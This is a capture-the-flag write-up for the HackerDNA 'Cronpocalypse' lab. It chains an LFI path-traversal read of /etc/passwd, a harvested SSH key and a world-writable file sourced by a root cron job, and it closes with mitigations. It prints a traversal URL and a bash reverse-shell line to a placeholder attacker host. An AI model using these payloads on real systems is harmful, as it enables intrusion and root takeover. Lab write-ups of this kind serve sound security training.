Lab Reference: https://hackerdna.com/labs/cronpocalypse

This writeup describes the complete attack chain for the Cronpocalypse lab on HackerDNA. The goal was to go from a vulnerable web application to full root access using a combination of Local File Inclusion (LFI), credential harvesting, and cron job abuse.

🔍 Reconnaissance

Nmap scan revealed two open ports:

nmap -sC -sV 10.10.10.10
  • Port 80 – Python web app (Werkzeug)
  • Port 22 – OpenSSH

🌐 Web Vulnerability – LFI

The "Features" page had a parameter page that loaded local files. Testing with:

http://10.10.10.10/features?page=../../../../etc/passwd

This successfully returned the system's passwd file, confirming a Local File Inclusion vulnerability.

🔑 Credential Harvesting & SSH Access

Using the LFI, I read sensitive files and discovered an SSH private key for a low-privileged user. After saving the key and setting correct permissions, I established an SSH session:

ssh user@10.10.10.10 -i id_rsa

The first flag was found in the user's home directory.

⏱️ Privilege Escalation via Cron Job

System enumeration revealed a cron job running every minute as root:

* * * * * root /usr/local/bin/backup.sh

The script /usr/local/bin/backup.sh sourced a file from /tmp/config.sh, which was world-writable. This misconfiguration allowed any user to modify the script executed by root.

💣 Exploitation

I appended a reverse shell payload to /tmp/config.sh:

echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /tmp/config.sh

After setting up a netcat listener, the cron job executed within a minute, returning a root reverse shell. The final flag was retrieved from /root.

🧠 Key Learnings & Mitigations

  • ✅ Validate all user input – LFI can lead to full compromise.
  • ✅ Never store credentials or private keys in accessible files.
  • ✅ Avoid running cron jobs as root if possible, and never execute writable scripts from world-accessible directories.
  • ✅ Regular system audits for misconfigurations.

🛠️ Tools Used

  • Nmap
  • Browser / Burp Suite
  • SSH
  • Netcat
  • Linux command line

This lab provided a realistic chain of vulnerabilities – from web LFI to root cron abuse – highlighting the importance of defense in depth.
